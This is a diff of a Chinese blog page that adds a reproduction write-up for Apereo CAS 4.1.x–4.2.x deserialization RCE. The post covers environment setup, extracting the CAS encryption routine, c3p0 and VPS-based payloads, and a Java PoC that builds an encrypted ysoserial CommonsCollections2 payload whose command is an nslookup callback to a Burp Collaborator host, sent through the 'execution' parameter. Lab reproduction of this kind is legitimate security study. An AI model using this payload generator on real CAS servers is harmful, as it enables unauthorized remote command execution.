@@ -81,16 +81,30 @@
 
 
 
-<meta name="description" content="我的生活，你的梦想。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="chensir`Blog">
-<meta property="og:url" content="http://yoursite.com/archives/2020/index.html">
+<meta name="description" content="Apereo CAS 4.1.7 ～ 4.2.X RCE复现Apereo-CAS-RCE复现 一、环境准备这里使用和原文一样的版本，这样代码好找点。https://repo1.maven.org/maven2/org/jasig/cas/cas-server-webapp/4.2.7/cas-server-webapp-4.2.7.wareclipse :能跑代码就行vps: 一台能被远程加载访问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apereo-CAS-RCE复现">
+<meta property="og:url" content="http://yoursite.com/2020/03/06/Apereo-CAS-RCE复现/index.html">
 <meta property="og:site_name" content="chensir`Blog">
-<meta property="og:description" content="我的生活，你的梦想。">
+<meta property="og:description" content="Apereo CAS 4.1.7 ～ 4.2.X RCE复现Apereo-CAS-RCE复现 一、环境准备这里使用和原文一样的版本，这样代码好找点。https://repo1.maven.org/maven2/org/jasig/cas/cas-server-webapp/4.2.7/cas-server-webapp-4.2.7.wareclipse :能跑代码就行vps: 一台能被远程加载访问">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/img/cas1.png">
+<meta property="og:image" content="http://yoursite.com/img/cas2.png">
+<meta property="og:image" content="http://yoursite.com/img/cas3.png">
+<meta property="og:image" content="http://yoursite.com/img/cas4.png">
+<meta property="og:image" content="http://yoursite.com/img/cas5.png">
+<meta property="og:image" content="http://yoursite.com/img/cas6.png">
+<meta property="og:image" content="http://yoursite.com/img/cas7.png">
+<meta property="og:image" content="http://yoursite.com/img/cas8.png">
+<meta property="og:image" content="http://yoursite.com/img/cas9.png">
+<meta property="og:image" content="http://yoursite.com/img/cas10.png">
+<meta property="og:image" content="http://yoursite.com/img/cas11.png">
+<meta property="og:image" content="http://yoursite.com/img/cas12.png">
+<meta property="og:updated_time" content="2020-03-06T03:10:10.241Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="chensir`Blog">
-<meta name="twitter:description" content="我的生活，你的梦想。">
+<meta name="twitter:title" content="Apereo-CAS-RCE复现">
+<meta name="twitter:description" content="Apereo CAS 4.1.7 ～ 4.2.X RCE复现Apereo-CAS-RCE复现 一、环境准备这里使用和原文一样的版本，这样代码好找点。https://repo1.maven.org/maven2/org/jasig/cas/cas-server-webapp/4.2.7/cas-server-webapp-4.2.7.wareclipse :能跑代码就行vps: 一台能被远程加载访问">
+<meta name="twitter:image" content="http://yoursite.com/img/cas1.png">
 
 
 
@@ -120,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2020/">
+  <link rel="canonical" href="http://yoursite.com/2020/03/06/Apereo-CAS-RCE复现/">
 
 
 
 
 
-  <title>归档 | chensir`Blog</title>
+  <title>Apereo-CAS-RCE复现 | chensir`Blog</title>
   
 
 
@@ -145,7 +159,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -281,107 +295,193 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        嗯..! 目前共计 7 篇日志。 继续努力。
-      </span>
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2020">2020</h1>
-          </div>
-        
-        
-
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/Apereo-CAS-RCE复现/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chensir">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/favicon.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chensir`Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2020/03/06/Apereo-CAS-RCE复现/" itemprop="url">
-              
-                <span itemprop="name">Apereo-CAS-RCE复现</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">Apereo-CAS-RCE复现</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-03-06T10:53:45+08:00" content="2020-03-06">
-          03-06
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-06T10:53:45+08:00">
+                2020-03-06
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/01/09/sql注入报错句/" itemprop="url">
-              
-                <span itemprop="name">sql注入报错语句</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-01-09T10:57:29+08:00" content="2020-01-09">
-          01-09
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
+      
+        <h1 id="Apereo-CAS-4-1-7-～-4-2-X-RCE复现"><a href="#Apereo-CAS-4-1-7-～-4-2-X-RCE复现" class="headerlink" title="Apereo CAS 4.1.7 ～ 4.2.X RCE复现"></a>Apereo CAS 4.1.7 ～ 4.2.X RCE复现</h1><p>Apereo-CAS-RCE复现</p>
+<h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><p>这里使用和原文一样的版本，这样代码好找点。<br><a href="https://repo1.maven.org/maven2/org/jasig/cas/cas-server-webapp/4.2.7/cas-server-webapp-4.2.7.war" target="_blank" rel="noopener">https://repo1.maven.org/maven2/org/jasig/cas/cas-server-webapp/4.2.7/cas-server-webapp-4.2.7.war</a><br>eclipse :能跑代码就行<br>vps: 一台能被远程加载访问就行<br>tomcat : 一只</p>
+<a id="more"></a>
+<h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><p>首先通过原文的仔细阅读，才最终可以复现这个漏洞，最后我没去搞清楚KEY如何生成。<br>但是通过原文和自己复现的理解。我们要达到RCE 还是要知道KEY的。</p>
+<p>首先我把我的war包放置到我们的webapps下。然后和原文一样去修改我们的密钥。<br>把我们的war包改成zip格式，然后直接打开编辑WEB-INF\cas.properties<br>编辑这两个参数为我们知道的key然后保存下来</p>
+<p><img src="/img/cas1.png" alt="1"><br>还有下面的两个参数<br><img src="/img/cas2.png" alt="2"><br>和原本的一样，key的话可以自己设定。<br>然后改成war包。启动我们的猫<br>访问localhost/cas-server-webapp-4.2.7<br>就可以访问到我们的界面<br><img src="/img/cas3.png" alt="3"><br>到这里环境就搭建完毕。</p>
+<h3 id="三、分析文章编写EXP"><a href="#三、分析文章编写EXP" class="headerlink" title="三、分析文章编写EXP"></a>三、分析文章编写EXP</h3><p>原文说到payload，先用encode加密后再进行一次base64编码。<br>那我们要做的就是把encode给调试出来。那么这里我们通过原文可以知道encode函数在我们的cas-server-core-util.jar!/jasig/cas/util/BinaryCipherExecutor.java<br>通过反编译war包我们也学着去找到那个文件。</p>
+<p><img src="/img/cas4.png" alt="4"><br>可以看到我们的加密方法在我们的类BinaryCipherExecutor 里<br>那么我们要生成我们的加密payload，那就是要把这个文件的encode给调出来。<br>打开我们的eclipse。然后创建个java项目<br>导入我们需要用到他的jar包<br><img src="/img/cas5.png" alt="5"><br>下图为调试调用了encode方法的<br><img src="/img/cas6.png" alt="6"></p>
+<p>可以看到我们encode出来了！！！<br><img src="/img/cas7.png" alt="7"><br>于是现在就和先知一样。调用c3p0生成我们的序列化对象<br>然后将序列化对象进行加密即可。<br><img src="/img/cas8.png" alt="8"></p>
+<h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><p>复制生成我们的payload<br>然后vps开启服务<br>然后请求登录抓取RAW包。修改我们的execution 参数为：上面生成的PAYLOAD<br>即可执行命令</p>
+<p><img src="/img/cas9.png" alt="9"><br><img src="/img/cas10.png" alt="10"></p>
+<h1 id="Apereo-CAS-4-1-X-4-1-6-RCE复现"><a href="#Apereo-CAS-4-1-X-4-1-6-RCE复现" class="headerlink" title="Apereo CAS 4.1.X ~ 4.1.6 RCE复现"></a>Apereo CAS 4.1.X ~ 4.1.6 RCE复现</h1><p>该版本和上面复现的版本不一样，上面的版本需要知道KEY才可以。这个版本，调用的是默认key。且依赖包有commons-collections4-4.0.jar 所以复现就及其简单。直接替换payload无需像C3P0一样需要VPS。</p>
+<p>POC：<br>import org.cryptacular.util.CodecUtil;<br>import org.jasig.spring.webflow.plugin.EncryptedTranscoder;</p>
+<p>import ysoserial.payloads.ObjectPayload;</p>
+<p>public class ApereoExploit {</p>
+<pre><code>public static void main(String[] args) throws Exception{
+    String poc[] = {&quot;CommonsCollections2&quot;,&quot;nslookup zil1vptnk7keebb2vi8bm7qr4iaby0.burpcollaborator.net&quot;};
+    final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]);
+    //AES加密
+    EncryptedTranscoder et = new EncryptedTranscoder();
+    byte[] encode = et.encode(payloadObject);
+    //base64编码
+    System.out.println(CodecUtil.b64(encode));
+}</code></pre><p>}</p>
+<p>有了上面一篇复现流程。下面这个有POC的直接同样的调试即可马上得到payload</p>
+<p><img src="/img/cas11.png" alt="11"><br><img src="/img/cas12.png" alt="12"></p>
+
+      
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/09/sql注入报错句/" rel="next" title="sql注入报错语句">
+                <i class="fa fa-chevron-left"></i> sql注入报错语句
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -389,6 +489,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -409,8 +513,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -507,6 +620,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Apereo-CAS-4-1-7-～-4-2-X-RCE复现"><span class="nav-number">1.</span> <span class="nav-text">Apereo CAS 4.1.7 ～ 4.2.X RCE复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、环境准备"><span class="nav-number">1.0.1.</span> <span class="nav-text">一、环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、环境搭建"><span class="nav-number">1.0.2.</span> <span class="nav-text">二、环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、分析文章编写EXP"><span class="nav-number">1.0.3.</span> <span class="nav-text">三、分析文章编写EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、漏洞复现"><span class="nav-number">1.0.4.</span> <span class="nav-text">四、漏洞复现</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#Apereo-CAS-4-1-X-4-1-6-RCE复现"><span class="nav-number">2.</span> <span class="nav-text">Apereo CAS 4.1.X ~ 4.1.6 RCE复现</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -654,6 +783,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
